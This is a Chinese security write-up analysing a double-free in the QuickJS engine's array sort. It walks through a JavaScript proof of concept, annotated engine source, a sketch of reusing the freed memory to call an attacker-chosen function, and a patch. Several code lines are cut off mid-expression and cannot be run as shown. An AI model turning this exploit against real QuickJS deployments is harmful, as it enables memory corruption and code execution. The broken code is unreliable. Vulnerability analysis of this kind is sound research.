**作者：Alex**  
**本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！ 投稿邮箱：PI:EMAIL**
## 0x01 介绍
[Quickjs](https://bellard.org/quickjs/)是我偶像的偶像所写的一个轻量的js引擎，先放张benchmark。可以看到作为一个轻量的js引擎，Quickjs是十分优秀的。在评分上甚至和Hermes这种重型js引擎并驾齐驱。虽然和v8相比还是有不小差距，但是毕竟是一个人开发的，而且相比v8，Quickjs才620kb。
![
](https://images.seebug.org/content/images/2019/08/49c3cbd2-5a47-45cc-8a88-abd49383fa8e.png-w331s)
具体特性这里就不讲了，有兴趣的可以去Quickjs的作者网站 https://bellard.org/quickjs/，
了解Quickjs的更多特性的同时， 也顺便膜拜一下大神。
之所以写这篇文章还是因为偶像的一个微博。
接下来通过对POC和Quickjs的源码进行分析，看看这个漏洞到底是如何产生的，以及如何利用和修复。
## 0x02 POC
     let spray = new Array(100);
     let a = [{hack:0},1,2,3,4]; // 在heap上分配内存给{hack:0}, a[0]指向相对应的对象在堆中的地址
     let refcopy = [a[0]]; // refcopy指向{hack:0}
    // 抛出异常
     a.__defineSetter__(3,()=>{throw 1;}); 
    // 下面的排序会触发异常抛出，具体如何触发下文会有介绍
     try {
            a.sort(function(v){if (v == a[0]) return 0; return 1;}); 
     }
     catch (e){}
     a[0] = 0; // 对象{hack：0}的引用减少1,小于等于0,导致内存被收回
     for (let i=0; i= array_size) {
                size_t new_size, slack;
                ValueSlot *new_array;
                new_size = (array_size + (array_size >> 1) + 31) & ~15;
                // 分配新的内存空间给一个临时队列，用于排序
                new_array = js_realloc2(ctx, array, new_size * sizeof(*array),
                &slack);
                if (new_array == NULL)
                    goto exception;
                new_size += slack / sizeof(*new_array);
                array = new_array;
                array_size = new_size;
            }
            // 尝试获取对象的属性，并赋值给新生成的array
            // 此函数会增加{hack:0}的引用计数， 下文有专门介绍
            present = JS_TryGetPropertyInt64(ctx, obj, i, &array[pos].val);
            if (present {throw 1;});
                if (JS_SetPropertyInt64(ctx, obj, n, array[n].val)  0; i++) {
            if (JS_SetPropertyInt64(ctx, obj, i, JS_UNDEFINED)  0) {
                // JS_NewInt32里面调用JS_DupValue，将会增加对象{hack:0}的引用计数
                val = JS_GetPropertyValue(ctx, obj, JS_NewInt32(ctx, idx));
                // #define unlikely(x)  __builtin_expect(!!(x), 0)
                if (unlikely(JS_IsException(val)))
                    present = -1;
            }
        } else {
            prop = JS_NewAtomInt64(ctx, idx);
            present = -1;
            if (likely(prop != JS_ATOM_NULL)) {
                present = JS_HasProperty(ctx, obj, prop);
                if (present > 0) {
                    val = JS_GetProperty(ctx, obj, prop);
                    if (unlikely(JS_IsException(val)))
                        present = -1;
                }
                JS_FreeAtom(ctx, prop);
            }
        }
        *pval = val;
        return present;
    }
最后是JS_FreeValue。 顾名思义是一个减少引用计数，释放内存的函数。
    static inline void JS_FreeValue(JSContext *ctx, JSValue v)
    {
        if (JS_VALUE_HAS_REF_COUNT(v)) {
            JSRefCountHeader *p = JS_VALUE_GET_PTR(v); 
            // Quickjs使用引用计数的方式做垃圾回收
            // 当引用减少到小于等于0时，释放相应内存
            if (--p->ref_count {throw 1;});
    try {
            a.sort(function(v){if (v == a[0]) return 0; return 1;});
    }
    catch (e){}
    a[0] = 0;
    // 用函数地址覆盖错误释放的内存
    for (let i=0; i {console.log("hack")}; 
    console.log(refcopy[0]()); // "hack"
## 0x06 修复
之前原理部分已经提到，出错的原因在于排序出错的时候，array的所有元素都会被引用计数减1，造成重复释放。所以只要去掉重复释放的地方就可以。一种修改方法是当顺序不变的时候先不释放，等全部元素都写回object之后在把array中所有元素集中一起释放。还有一种修改方法是在出错的时候不要重复释放之前已经释放的元素，具体修改如下：
    ...
    exception:
        // for (n = 0; n 
* * *